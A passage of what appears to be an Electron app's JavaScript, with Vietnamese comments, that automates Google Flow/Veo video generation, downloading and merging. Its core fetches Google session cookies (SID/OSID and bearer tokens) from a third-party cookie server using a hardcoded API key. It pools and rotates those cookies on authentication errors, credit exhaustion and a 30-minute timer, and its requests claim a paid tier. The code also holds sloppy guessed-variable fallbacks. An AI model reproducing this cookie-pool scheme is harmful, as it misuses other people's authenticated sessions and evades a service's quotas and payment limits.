      a.webContents.send("download-progress", {
        percent: 0,
        resolution: resSetting,
        promptId: pId,
      });
      try {
        console.log(`[Upscale] Đang nâng cấp lên ${resSetting}...`);
        await s0(downloadPath, finalSavePath, resSetting, a, pId);
        console.log(`[Upscale] Hoàn tất, xóa file tạm.`);
        try {
          be.unlinkSync(downloadPath);
        } catch (err) { }
      } catch (upscaleErr) {
        console.error("[Upscale] Lỗi, giữ nguyên bản gốc:", upscaleErr);
        if (downloadPath !== finalSavePath) {
          try { be.renameSync(downloadPath, finalSavePath); } catch { }
        }
      }
    }

    const s = { success: !0, path: finalSavePath, resolution: resSetting, isUpscale: !!isUpscale, promptId: pId };
    return a.webContents.send("download-complete", s), s;
  } catch (e) {
    console.error("Download error:", e);
    const o = { success: !1, error: e.message };
    return a.webContents.send("download-complete", o), o;
  }
};
he.ipcMain.on(
  "download-video",
  async (
    a,
    {
      url: i,
      promptText: c,
      savePath: h,
      promptIndex: f,
      isUpscale: u,
      upscaleResolution: res,
    }
  ) => {
    const t = he.BrowserWindow.fromWebContents(a.sender);
    if (!t) return;
    await Ho(
      t,
      i,
      c,
      h,
      f,
      {
        enabled: !!h,
        path: h,
        allowOverwrite: !1,
        splitFolders: !1,
        videosPerFolder: 10,
        isUpscale: u,
        upscaleResolution: res,
      },
      null
    ); // pId is null for single downloads
  }
); global.veoCookieCache = global.veoCookieCache || [];
global.uploadedImageCache = global.uploadedImageCache || new Map();

he.ipcMain.on(
  "browser:start-automation",
  async (
    a,
    {
      prompts: i,
      authToken: c,
      model: h,
      aspectRatio: f,
      autoSaveConfig: t,
      currentUser: r,
      concurrentStreams: l,
      activeCookie: ac,
      localCookies: lc,
      upscaleMode: um,
    }
  ) => {
    if (t && um && !t.resolution) {
      t.resolution = um;
    }
    const e = he.BrowserWindow.fromWebContents(a.sender);
    if (!e) return;

    // 1. Kiểm tra gói cước
    if (
      !r ||
      !r.subscription ||
      new Date(r.subscription.end_date) < new Date()
    ) {
      const msg = r?.subscription
        ? "Gói đăng ký đã hết hạn."
        : "Bạn cần nâng cấp gói.";
      he.dialog.showMessageBox(e, {
        type: "warning",
        title: "Yêu Cầu Nâng Cấp",
        message: msg,
      });
      e.webContents.send("navigate-to-view", "packages");
      return;
    }

    $e = !1; // Reset cờ dừng
    newSessionAbortController();
    // ===== [BUGFIX-404] Xóa cache session cũ khi bắt đầu chạy =====
    if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
    threadTokenCache.clear();
    if (global.flowClaimedMediaIds) global.flowClaimedMediaIds.clear();
    if (global.flowClaimedVideoUrls) global.flowClaimedVideoUrls.clear();
    if (global.flowTrackedVideos) global.flowTrackedVideos.clear();
    console.log("[BUGFIX-404] Đã xóa cache session cũ (uploadedImageCache, bananaFrontendUploadCache, threadTokenCache, flowClaimed).");
    // =============================================================
    const MAX_RETRIES = 3;
    const COOKIE_TTL = 60 * 60 * 1000; // 1 Giờ
    let localConsumed = new Set();
    if (ac && ac.value) localConsumed.add(ac.value);

    // Hàm gửi log
    const sendLog = (
      promptId,
      message,
      status,
      videoUrl = null,
      opName = null,
      sceneId = null,
      mediaId = null,
      projectId = null,
      cookie = null
    ) => {
      if (($e || Qe) && status !== "idle" && status !== "finished") return;
      if (e && !e.isDestroyed()) {
        e.webContents.send("browser:log", {
          promptId,
          message,
          status,
          videoUrl,
          operationName: opName,
          sceneId,
          mediaId,
          projectId,
          cookie,
        });
      }
      // console.log(`[${promptId || "System"}] ${message}`);
    };

    // --- QUẢN LÝ COOKIE POOL ---

    // Hàm kiểm tra tính hợp lệ của Cookie Google Flow
    const isValidCookie = (c) => {
      if (!c) return false;
      const val = typeof c === "string" ? c : (c.value || c.cookie || "");
      if (typeof val !== "string" || val.trim().length < 50) return false;
      const hasToken = !!(c.bearerToken && c.bearerToken !== "FLOW_SESSION" && String(c.bearerToken).startsWith("AFfZSp"));
      return (val.includes("SID=") && (val.includes("OSID=") || hasToken)) || (val.includes("OSID=") && hasToken);
    };

    // Hàm lấy Cookie mới từ Server
    const fetchNewCookieFromServer = async (reason = "") => {
      try {
        const res = await (
          await fetch(kinxCookieUrl(reason), {
            headers: { "X-API-Key": "kinx@0$*2048", Authorization: `Bearer ${c}` },
          })
        ).json();
        if (res.success && res.cookie) return res.cookie;
        throw new Error("Server không trả về cookie hợp lệ.");
      } catch (err) {
        throw new Error(`Lỗi lấy cookie: ${err.message}`);
      }
    };

    // Hàm khởi tạo Project cho một Cookie
    const initProjectForCookie = async (cookie, index) => {
      // Tạo project qua flow.google.com batchexecute (jHPbke) + lấy UUID (UpteDb),
      // cookie dùng chung từ kinxcookie.php (thay cho labs project.createProject).
      try {
        const projectId = await flowCreateProject(c, flowDefaultProjectTitle(), cookie);
        console.log(`[Init] Tạo project qua Flow RPC thành công: ${projectId}`);
        return projectId;
      } catch (err) {
        throw new Error(`Không tạo được project Flow: ${err.message}`);
      }
    };

    // Hàm Chuẩn bị Pool Cookie (Chạy 1 lần khi bắt đầu)
    const prepareCookiePool = async () => {
      global.veoCookieCache = [];
      const requiredCookies = 1;
      sendLog(
        null,
        `Cấu hình: ${l} luồng. Đang kiểm tra Cookie...`,
        "running"
      );

      const hasActiveLocal = isValidCookie(ac);
      const validLocals = (Array.isArray(lc) ? lc : []).filter(isValidCookie);

      let waitAnnounced = false;
      let initFailReason = "";
      while (global.veoCookieCache.length < requiredCookies) {
        if ($e) break;
        const idx = global.veoCookieCache.length + 1;

        let newCookie = null;
        try {
          // 1. Ưu tiên Cookie Server trước
          newCookie = await fetchNewCookieFromServer(initFailReason);
          initFailReason = "";
          if (newCookie && isValidCookie(newCookie)) {
            sendLog(
              null,
              `Cookie #${idx}: Lấy Cookie từ Server thành công (Ưu tiên Server).`,
              "success"
            );
          } else {
            newCookie = null;
          }
        } catch (serverErr) {
          // 2. Server không trả cookie -> mới dùng Profile Local nếu có
          if (hasActiveLocal) {
            newCookie = ac;
            sendLog(
              null,
              `Cookie #${idx}: Server không trả cookie, sử dụng Cookie Local (Profile) dự phòng.`,
              "warning"
            );
          } else if (validLocals.length > 0) {
            newCookie = validLocals[0];
            sendLog(
              null,
              `Cookie #${idx}: Server không trả cookie, sử dụng Cookie Local "${newCookie.name || 'Local'}" dự phòng.`,
              "warning"
            );
          }
        }

        // 3. Nếu KHÔNG có cookie nào hợp lệ (cả server lẫn local profile)
        if (!newCookie || !isValidCookie(newCookie)) {
          if (!waitAnnounced) {
            sendLog(null, "Đang chờ Cookie (Server chưa cấp và chưa có Profile Local)...", "processing");
            for (const item of i) {
              sendLog(item.id, "Đang chờ Cookie khả dụng...", "processing");
            }
            waitAnnounced = true;
          }
          // Chờ 5s rồi thử xin lại Cookie từ Server (hoặc chờ người dùng thêm Profile / bấm Dừng)
          await cancellableSleep(5000);
          continue;
        }

        // 4. Đã có Cookie hợp lệ -> Khởi tạo Project Flow
        try {
          sendLog(null, `Đang kết nối dự án Flow cho Cookie #${idx}...`, "processing");
          const projectId = await initProjectForCookie(newCookie, idx);
          global.veoCookieCache.push({
            cookie: newCookie,
            projectId: projectId,
            timestamp: Date.now(),
            id: `pool-${idx}-${Date.now()}`,
            activeTasks: 0,
          });
          waitAnnounced = false;
        } catch (err) {
          initFailReason = "401";
          console.warn(`Lỗi tạo project Flow cho Cookie #${idx}: ${err.message}`);
          sendLog(null, `Lỗi kết nối Project (${err.message}), đang đổi Cookie khác...`, "processing");
          await cancellableSleep(3000);
        }
      }
      return global.veoCookieCache.length >= requiredCookies;
    };

    // Hàm làm mới 1 Cookie cụ thể trong Pool (Khi bị lỗi/hết credit/429/quá hạn 30p)
    const refreshCookieInPool = async (poolIndex, reason = "") => {
      if ($e || Qe) return false;
      try {
        // 1. Ưu tiên lấy Cookie mới từ Server trước
        try {
          const newCookie = await fetchNewCookieFromServer(reason);
          if ($e || Qe) return false;
          const newProjectId = await initProjectForCookie(newCookie, poolIndex);
          if ($e || Qe) return false;
          const oldItem = global.veoCookieCache[poolIndex];
          if (oldItem) {
            oldItem.isRetired = true;
            if (!oldItem.activeTasks || oldItem.activeTasks <= 0) {
              oldItem.cookie = null;
              oldItem.projectId = null;
            } else {
              console.log(`[Cookie Pool] Cookie cũ còn ${oldItem.activeTasks} luồng đang chạy, khóa cookie cũ lại chờ luồng chạy xong rồi mới xóa.`);
            }
          }
          global.veoCookieCache[poolIndex] = {
            cookie: newCookie,
            projectId: newProjectId,
            timestamp: Date.now(),
            id: `pool-server-${poolIndex}-${Date.now()}`,
            activeTasks: 0,
          };
          sendLog(null, `Đã làm mới Cookie từ Server thành công!`, "success");
          return true;
        } catch (serverErr) {
          console.warn(`[Refresh] Server không trả cookie mới: ${serverErr.message}`);
        }

        // 2. Server không trả cookie -> mới dùng sang Cookie Local Profile khác đã đăng nhập
        if (lc && Array.isArray(lc) && lc.length > 0) {
          const isValidProfile = (x) => {
            if (!x) return false;
            const val = x.value || x.cookie || '';
            const hasToken = !!(x.bearerToken && x.bearerToken !== 'FLOW_SESSION' && String(x.bearerToken).startsWith('AFfZSp'));
            const hasAuth = val.includes('SID=') && (val.includes('OSID=') || hasToken);
            return val.length > 200 && hasAuth && hasToken && x.status !== 'new' && x.status !== 'expired';
          };
          let candidates = lc.filter((x) => isValidProfile(x) && !localConsumed.has(x.value || x.cookie));
          if (candidates.length === 0) {
            localConsumed = new Set();
            candidates = lc.filter((x) => isValidProfile(x));
          }
          const currentValue = global.veoCookieCache[poolIndex]?.cookie?.value || global.veoCookieCache[poolIndex]?.cookie;
          const notCurrent = candidates.filter((x) => (x.value || x.cookie) !== currentValue);
          if (notCurrent.length > 0) candidates = notCurrent;
          for (const localCookie of candidates) {
            if ($e || Qe) return false;
            try {
              const localProjectId = await initProjectForCookie(localCookie, poolIndex);
              if ($e || Qe) return false;
              const oldItem = global.veoCookieCache[poolIndex];
              if (oldItem) {
                oldItem.isRetired = true;
                if (!oldItem.activeTasks || oldItem.activeTasks <= 0) {
                  oldItem.cookie = null;
                  oldItem.projectId = null;
                } else {
                  console.log(`[Cookie Pool] Cookie cũ còn ${oldItem.activeTasks} luồng đang chạy, khóa cookie cũ lại chờ luồng chạy xong rồi mới xóa.`);
                }
              }
              global.veoCookieCache[poolIndex] = {
                cookie: localCookie,
                projectId: localProjectId,
                timestamp: Date.now(),
                id: `pool-local-${poolIndex}-${Date.now()}`,
                activeTasks: 0,
              };
              const cVal = localCookie.value || localCookie.cookie;
              localConsumed.add(cVal);
              sendLog(null, `Server không có cookie, chuyển sang Profile local "${localCookie.name || 'Local'}"!`, "warning");
              return true;
            } catch (e) {
              console.warn(`[Refresh Cookie] Profile "${localCookie.name || 'Local'}" không tạo được project (${e.message}), bỏ qua...`);
              localConsumed.add(localCookie.value || localCookie.cookie);
            }
          }
        }

        console.error("[Refresh Cookie Error]: Server không trả cookie và không còn Profile Local khả dụng.");
        return false;
      } catch (err) {
        console.error("[Refresh Cookie Error]:", err.message);
        return false;
      }
    };

    // --- CORE LOGIC ---
    const processPrompt = async (item, poolIndex) => {
      // 1. Validation
      let promptText;
      try {
        if (
          !item.text ||
          typeof item.text !== "string" ||
          item.text.trim() === ""
        )
          throw new Error("Prompt trống.");
        try {
          const json = JSON.parse(item.text);
          promptText = json.prompt || json.text;
          if (!promptText || typeof promptText !== "string")
            throw new Error("JSON lỗi.");
          promptText = promptText.trim();
        } catch {
          promptText = item.text.trim();
        }
      } catch (err) {
        // [ĐÃ SỬA] Đổi status thành 'idle' để KHÔNG kích hoạt tự động chạy lại
        console.error(`[${item.id}] Validation Error:`, err.message);
        sendLog(item.id, `Đã dừng: ${err.message}`, "idle");
        return;
      }

      // Tối đa 3 lần thử tổng cộng cho mỗi prompt.
      let attempt = 0;
      while (attempt < 3) {
        if ($e) return; // Người dùng bấm Dừng
        attempt++;


        // Lấy Cookie từ Pool
        const safeIndex = poolIndex % global.veoCookieCache.length;
        let poolItem = global.veoCookieCache[safeIndex];

        // [MỚI] Kiểm tra nếu cookie trong pool đã dùng quá 30 phút -> xin cookie mới từ server
        const THIRTY_MINUTES = 30 * 60 * 1000;
        if (poolItem && poolItem.timestamp && (Date.now() - poolItem.timestamp >= THIRTY_MINUTES)) {
          sendLog(
            item.id,
            `Cookie đã dùng quá 30 phút, đang làm mới từ Server...`,
            "processing"
          );
          await refreshCookieInPool(safeIndex, "30m_rotate");
          poolItem = global.veoCookieCache[safeIndex];
        }

        // Nếu cookie trong pool lỗi hoặc chưa có -> Chờ hoặc làm mới, không bao giờ chạy bừa để bị 401
        if (!poolItem || !poolItem.cookie || !poolItem.projectId) {
          sendLog(
            item.id,
            `Đang chờ Cookie khả dụng (Luồng ${safeIndex})...`,
            "processing"
          );
          await refreshCookieInPool(safeIndex);
          poolItem = global.veoCookieCache[safeIndex];
          if (!poolItem || !poolItem.cookie || !poolItem.projectId) {
            sendLog(
              item.id,
              `Đang chờ Cookie từ Server hoặc Profile...`,
              "processing"
            );
            await cancellableSleep(5000);
            continue;
          }
        }

        // Khóa cookie cho luồng đang xử lý
        poolItem.activeTasks = (poolItem.activeTasks || 0) + 1;
        let taskCookieRef = poolItem;

        try {
          // Chỉ log trạng thái mỗi 5 lần thử để tránh spam UI
          if (attempt === 1 || attempt % 5 === 0) {
            sendLog(item.id, `Đang xử lý...`, "processing");
          }

          const sceneId = `client-generated-uuid-${Date.now()}-${Math.random()}`;
          const sessionBase = `;${Date.now()}`;
          const modelKey = flowFormatModelKey("veo_3_1_t2v_lite");

          // ============================================================
          // --- [CODE MỚI] XỬ LÝ TEXT-TO-VIDEO VÀ REFERENCE-IMAGE-TO-VIDEO ---
          // ============================================================
          const isRefMode = item.referenceImagesBase64 && Array.isArray(item.referenceImagesBase64) && item.referenceImagesBase64.length > 0;
          let genRes;
          let operation;

          if (isRefMode) {
            const safeRefImages = item.referenceImagesBase64.slice(0, 3);

            let refMediaIds = [];
            for (let idx = 0; idx < safeRefImages.length; idx++) {
              const base64Str = safeRefImages[idx];
              const cacheKey = `${poolItem.projectId}_${_r.createHash('md5').update(base64Str).digest('hex')}`;

              if (global.uploadedImageCache.has(cacheKey)) {
                const cached = global.uploadedImageCache.get(cacheKey);
                if (typeof cached === "string") {
                  sendLog(item.id, `Ảnh ${idx + 1}: Sẵn sàng (Cache) ⚡`, "submitting");
                  refMediaIds.push(cached);
                } else {
                  sendLog(item.id, `Ảnh ${idx + 1}: Chờ luồng khác tải... ⏳`, "submitting");
                  const mId = await cached;
                  if (!mId) throw new Error("Lỗi tải ảnh tham chiếu.");
                  refMediaIds.push(mId);
                }
              } else {
                sendLog(item.id, `Ảnh ${idx + 1}/${safeRefImages.length}: Đang tải lên... 📤`, "submitting");
                const uploadPromise = bo(e, base64Str, poolItem.cookie, item.id, poolItem.projectId, "browser:log");
                global.uploadedImageCache.set(cacheKey, uploadPromise);
                const mId = await uploadPromise;
                if (mId) {
                  global.uploadedImageCache.set(cacheKey, mId);
                  refMediaIds.push(mId);
                } else {
                  global.uploadedImageCache.delete(cacheKey);
                  throw new Error("Lỗi tải ảnh tham chiếu.");
                }
              }
            }

            sendLog(item.id, "Đang gửi lệnh tạo Video (NV Đồng Nhất)...", "processing");

            const isPortrait = f === "PORTRAIT" || f === "9:16";
            const aspectStr = isPortrait ? "portrait" : (f === "16:9" ? "landscape" : "landscape");
            const aspectEnum = isPortrait ? "PORTRAIT" : "LANDSCAPE";

            const modelKeyR2V = flowFormatModelKey("veo_3_1_r2v_lite");

            const requestPayload = {
              aspectRatio: `VIDEO_ASPECT_RATIO_${aspectEnum}`,
              textInput: { structuredPrompt: { parts: [{ text: promptText }] } },
              videoModelKey: modelKeyR2V,
              metadata: {},
              seed: Math.floor(Math.random() * 1e5),
              referenceImages: refMediaIds.map(mId => ({
                mediaId: mId,
                imageUsageType: "IMAGE_USAGE_TYPE_ASSET"
              }))
            };

            const payload = {
              mediaGenerationContext: {
                batchId: _r.randomUUID(),
                audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
              },
              clientContext: {
                projectId: poolItem.projectId,
                tool: "IMAGE_FX",
                userPaygateTier: "PAYGATE_TIER_TWO",
                sessionId: sessionBase,
              },
              requests: [requestPayload],
              useV2ModelConfig: true
            };

            genRes = await We(null, {
              // url: "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoReferenceImages",
              url: "https://flow.google.com/v1/video:batchAsyncGenerateVideoReferenceImages",
              cookie: poolItem.cookie,
              options: {
                method: "POST",
                headers: {},
                body: { ...payload, useV2ModelConfig: true },
              },
            });

          } else {
            sendLog(item.id, "Đang xử lý Video (Text)...", "processing");

            const payload = {
              mediaGenerationContext: {
                batchId: _r.randomUUID(),
                audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
              },
              clientContext: {
                projectId: poolItem.projectId,
                tool: "IMAGE_FX",
                userPaygateTier: "PAYGATE_TIER_TWO",
                sessionId: sessionBase,
              },
              requests: [
                {
                  aspectRatio: `VIDEO_ASPECT_RATIO_${(f === "9:16" ? "PORTRAIT" : f === "16:9" ? "LANDSCAPE" : f).toUpperCase()}`,
                  textInput: { structuredPrompt: { parts: [{ text: promptText }] } },
                  videoModelKey: modelKey,
                  metadata: {},
                  seed: Math.floor(Math.random() * 1e5),
                },
              ],
            };

            genRes = await We(null, {
              // url: "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoText",
              url: "https://flow.google.com/v1/video:batchAsyncGenerateVideoText",
              cookie: poolItem.cookie,
              options: {
                method: "POST",
                headers: {},
                body: { ...payload, useV2ModelConfig: true },
              },
            });
          }

          // [FIX] Mapping chuẩn theo schema API Veo mới
          const workflow = genRes?.workflows?.[0];
          const media = genRes?.media?.[0];
          const opName = media?.name || workflow?.name || genRes?.media?.[0]?.operation?.name;
          const sId = media?.sceneId || media?.workflowId || workflow?.name || genRes?.media?.[0]?.sceneId || genRes?.sceneId || "fake_scene_id";

          if (!opName || !sId) {
            console.error("Lỗi API Trả về:", JSON.stringify(genRes));
            throw new Error("Không lấy được workflow name hoặc sceneId.");
          }
          operation = { operation: { name: opName }, sceneId: sId };
          // ============================================================
          if (!(operation?.operation?.name || operation?.name) || !operation?.sceneId)
            throw new Error("Lỗi API: Không có Operation Name.");

          // Polling trạng thái
          let isComplete = false;
          while (!isComplete && !$e) {
            await cancellableSleep(40000);
            if ($e) return;

            // sendLog(item.id, "Đang xử lý...", "processing"); // Ẩn bớt log này cho đỡ lag

            const checkRes = await We(null, {
              // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
              url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
              cookie: poolItem.cookie,
              options: {
                method: "POST",
                body: { media: [{ name: (operation.operation?.name || operation.name), projectId: poolItem.projectId }] },
              },
            });


            console.log("[Extended Video] checkRes:", JSON.stringify(checkRes).substring(0, 500));
            const opStatus = checkRes?.media?.[0] || checkRes?.media?.[0] || checkRes;

            if (!opStatus) continue;

            const statusStr = (opStatus.status || opStatus.mediaMetadata?.mediaStatus?.mediaGenerationStatus || "").toUpperCase();

            if (statusStr === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
              const vidMeta = opStatus.operation?.metadata?.video || opStatus.video || checkRes.video;
              let videoUrl = vidMeta?.fifeUrl || vidMeta?.servingBaseUri || vidMeta?.generatedVideo?.fifeUrl || vidMeta?.generatedVideo?.servingBaseUri;
              if (!videoUrl) {
                try {
                  // Dynamically get mediaId from available variables (S, m, checkRes, etc)
                  let mId = "";
                  if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name;
                  if (!mId && typeof checkRes !== 'undefined') mId = checkRes?.media?.[0]?.name;
                  if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name;
                  if (!mId && typeof m !== 'undefined') mId = m?.operation?.name || m?.name;

                  if (mId) {
                    const fetchFn = global.fetch || require("node-fetch");
                    // Find available cookie variable
                    let cVal = "";
                    if (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) cVal = poolItem.cookie;
                    else if (typeof cookie !== 'undefined') cVal = cookie;
                    else if (typeof c !== 'undefined') cVal = c;
                    else if (typeof h !== 'undefined') cVal = h;

                    if (typeof cVal === "object") cVal = cVal.value;


                    console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                    const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                    if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                      videoUrl = redirectRes.headers.get("location");
                    } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                      videoUrl = redirectRes.url;
                    } else {
                      try {
                        const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                        const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                        if (signed) { videoUrl = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                      } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                    }
                  }
                } catch (e) {
                  console.error("Lỗi Redirect API:", e);
                }
              }

              if (!videoUrl) {
                try {
                  const mediaId = opStatus.operation?.name || checkRes?.media?.[0]?.name;
                  if (mediaId) {
                    console.log("[Batch Video] Gọi Redirect API để lấy videoUrl cho ID:", mediaId);

                    const fetchFn = global.fetch || require("node-fetch");
                    const mySuperUniqueCookieVar123 = (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) ? poolItem.cookie : ((typeof cookie !== 'undefined') ? cookie : "");

                    console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                    const redirectRes = await flowMediaRedirectResponse(mediaId, (typeof mySuperUniqueCookieVar123 === "object" ? mySuperUniqueCookieVar123.value : mySuperUniqueCookieVar123));
                    if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                      videoUrl = redirectRes.headers.get("location");
                      console.log("[Batch Video] Đã lấy được link video thực tế:", videoUrl);
                    } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                      videoUrl = redirectRes.url;
                    } else {
                      console.log("[Batch Video] Redirect API trả về status bất thường:", redirectRes.status, await redirectRes.text());
                      try {
                        const cValStr = (typeof mySuperUniqueCookieVar123 === "object" && mySuperUniqueCookieVar123) ? (mySuperUniqueCookieVar123.value || "") : (mySuperUniqueCookieVar123 || "");
                        const signed = await fetchFlowMediaSignedUrl(mediaId, cValStr);
                        if (signed) { videoUrl = signed; console.log("[Redirect] as29s fallback lấy URL:", signed); }
                      } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                    }
                  }
                } catch (e) {
                  console.error("[Batch Video] Lỗi Redirect API:", e);
                }
              }

              const mediaId = vidMeta?.mediaGenerationId || vidMeta?.generatedVideo?.mediaGenerationId || vidMeta?.name;

              if (videoUrl) {
                if (t.enabled && t.path) {
                  await Ho(e, videoUrl, item.text, t.path, item.originalIndex, t, item.id);
                }
                sendLog(item.id, "Thành công!", "success", videoUrl,
                  (operation.operation?.name || operation.name), operation.sceneId,
                  mediaId, poolItem.projectId, poolItem.cookie);
                return;
              }
            } else if (statusStr === "MEDIA_GENERATION_STATUS_FAILED") {
              const detail = opStatus.error?.message || opStatus.mediaStatus?.statusDetail || "Vi Phạm Chính sách";
              console.error(`[${item.id}] Chi tiết lỗi FAILED:`, JSON.stringify(opStatus));
              throw new Error(`Lỗi Veo API (FAILED): ${detail}`);
            }
          }
        } catch (err) {
          if ($e || Qe || String(err.message || "").includes("SESSION_STOPPED")) return;
          // Giữ nguyên cookie + project cho toàn phiên.
          const errMsg = String(err.message || "").toLowerCase();
          const statusCode = Number(err.statusCode || err.status || 0);
          const is401 = statusCode === 401 || errMsg.includes("401") || errMsg.includes("unauthenticated");
          const is429 = statusCode === 429 || errMsg.includes("429") || errMsg.includes("rate limit") || errMsg.includes("quota") || errMsg.includes("credit") || errMsg.includes("tín dụng") || errMsg.includes("insufficient") || errMsg.includes("resource_exhausted");
          const waitTime = is429 ? 10000 : 3000;
          const statusMsg = is401 ? "401: Lỗi xác thực" :
            is429 ? "Error 429 - hết credit đang đổi profile" :
              `${err.statusCode || "Error"} - ${err.message || JSON.stringify(err)}. Giữ nguyên cookie/project và thử lại...`;
          console.error(`[${item.id}] Error:`, err.message);
          sendLog(item.id, statusMsg, "processing");
          if (is401 || is429) {
            const rotated = await refreshCookieInPool(safeIndex, is401 ? "401" : "429");
            if (rotated) {
              attempt = Math.max(0, attempt - 1);
            }
          }
          await cancellableSleep(waitTime);
        } finally {
          if (taskCookieRef) {
            taskCookieRef.activeTasks = Math.max(0, (taskCookieRef.activeTasks || 1) - 1);
            if (taskCookieRef.isRetired && taskCookieRef.activeTasks === 0) {
              taskCookieRef.cookie = null;
              taskCookieRef.projectId = null;
              console.log("[Cookie Lifecycle] Cookie cũ đã hoàn thành luồng và đã được xóa sạch.");
            }
            taskCookieRef = null;
          }
        }
      }
    };    // --- MAIN EXECUTION FLOW ---

    // --- BẮT ĐẦU ĐOẠN SỬA ---
    let cookiePoolReady = false;
    try {
      cookiePoolReady = await prepareCookiePool();
    } catch (initErr) {
      console.warn(
        "Lỗi khởi tạo Pool Cookie từ Server, chuyển sang dùng Cookie cá nhân:",
        initErr.message
      );
    }

    // Đảm bảo mảng cache tồn tại để không bị lỗi undefined
    global.veoCookieCache = global.veoCookieCache || [];

    if (!cookiePoolReady || global.veoCookieCache.length === 0) {
      if (!$e) {
        sendLog(null, "Đã dừng: Chưa có Cookie khả dụng từ Server hoặc Profile.", "idle");
      }
      return;
    }
    // --- KẾT THÚC ĐOẠN SỬA ---

    const queue = [...i];
    const totalPrompts = queue.length;
    let activeWorkers = 0;
    let completedCount = 0;
    let workerIdCounter = 0; // Để chia cookie xoay vòng

    sendLog(null, `Bắt đầu xử lý ${totalPrompts} prompt.`, "running");

    // Bộ đếm định kỳ: Cứ mỗi 30s kiểm tra, nếu cookie nào đã sống >= 30 phút thì tự động xin cookie mới từ Server
    const rotate30mTimer = setInterval(async () => {
      if ($e || (queue.length === 0 && activeWorkers === 0)) {
        clearInterval(rotate30mTimer);
        return;
      }
      if (!Array.isArray(global.veoCookieCache) || global.veoCookieCache.length === 0) return;
      const now = Date.now();
      for (let idx = 0; idx < global.veoCookieCache.length; idx++) {
        const item = global.veoCookieCache[idx];
        if (item && item.timestamp && !item.isRotating && (now - item.timestamp >= 30 * 60 * 1000)) {
          item.isRotating = true;
          console.log(`[Auto Rotate 30m] Cookie #${idx + 1} đã quá 30 phút. Đang gọi Server xin cookie mới...`);
          sendLog(null, "Cookie đã dùng quá 30 phút, đang gọi Server xin cookie mới...", "processing");
          try {
            await refreshCookieInPool(idx, "30m_interval");
          } catch (e) {
            console.error(`[Auto Rotate 30m Error]:`, e.message);
            item.isRotating = false;
          }
        }
      }
    }, 30000);

    const runNext = () => {
      if ($e) {
        clearInterval(rotate30mTimer);
        queue.length = 0;
        return;
      }

      if (queue.length === 0 && activeWorkers === 0) {
        clearInterval(rotate30mTimer);
        if (!$e)
          sendLog(null, "===== Đã xử lý tất cả prompt! =====", "finished");
        return;
      }

      while (queue.length > 0 && activeWorkers < l) {
        const item = queue.shift();
        activeWorkers++;

        // Gán cookie theo worker ID (Load Balancing)
        // Worker 1 -> Cookie 1, Worker 7 -> Cookie 1 (nếu l=6), Worker 7 -> Cookie 2 (nếu l=6, logic xoay vòng)
        // Logic đơn giản: Chia đều index cho số lượng cookie hiện có
        const assignedCookieIndex =
          workerIdCounter % global.veoCookieCache.length;
        workerIdCounter++;

        processPrompt(item, assignedCookieIndex).finally(() => {
          activeWorkers--;
          completedCount++;
          // Cơ chế tự động điền ngay sau 0.5s
          setTimeout(() => {
            runNext();
          }, 500);
        });
      }
    };

    runNext();
  }
);

he.ipcMain.handle("select-video-files", async (a) => {
  const i = he.BrowserWindow.fromWebContents(a.sender);
  if (!i) return null;
  const { canceled: c, filePaths: h } = await he.dialog.showOpenDialog(i, {
    title: "Chọn các file video",
    properties: ["openFile", "multiSelections"],
    filters: [{ name: "Videos", extensions: ["mp4"] }],
  });
  return c || h.length === 0 ? null : h.map((f) => f.replace(/\\/g, "/"));
}); // --- FIX GHÉP VIDEO (HỖ TRỢ TỐT CẢ WINDOWS & MACOS) ---
he.ipcMain.handle("merge-videos", async (event, { videoPaths, savePath }) => {
  // 1. CẤU HÌNH ĐƯỜNG DẪN FFMPEG CHO MACOS (Windows tự bỏ qua đoạn này)
  if (process.platform === "darwin") {
    const macPaths = [
      "/opt/homebrew/bin",
      "/usr/local/bin",
      "/usr/bin",
      "/bin",
    ];
    // Giữ nguyên PATH cũ và nối thêm path mới vào đầu để ưu tiên tìm
    process.env.PATH = `${macPaths.join(":")}:${process.env.PATH || ""}`;
    console.log(
      ">>> [MacOS] Đã cập nhật PATH cho Merge Video:",
      process.env.PATH
    );
  }

  const win = he.BrowserWindow.fromWebContents(event.sender);
  if (!win) return { success: false, error: "Main window not found" };

  // 2. Xác định nơi lưu file
  let finalPath = "";
  if (savePath) {
    finalPath = ye.join(savePath, `merged-video-${Date.now()}.mp4`);
  } else {
    const { canceled, filePath } = await he.dialog.showSaveDialog(win, {
      title: "Lưu video đã ghép",
      defaultPath: `merged-video-${Date.now()}.mp4`,
      filters: [{ name: "MP4 Videos", extensions: ["mp4"] }],
    });
    if (canceled || !filePath) return { success: false, error: "Hủy lưu file" };
    finalPath = filePath;
  }

  // 3. Thực hiện ghép video
  return new Promise((resolve) => {
    // Tạo file list trung gian
    const listPath = ye.join(
      he.app.getPath("temp"),
      `filelist-${Date.now()}.txt`
    );

    // [QUAN TRỌNG CHO WINDOWS]
    // Chuyển đổi đường dẫn Windows (dấu \) sang dạng Unix (dấu /) để FFmpeg đọc được file list
    const fileContent = videoPaths
      .map((p) => {
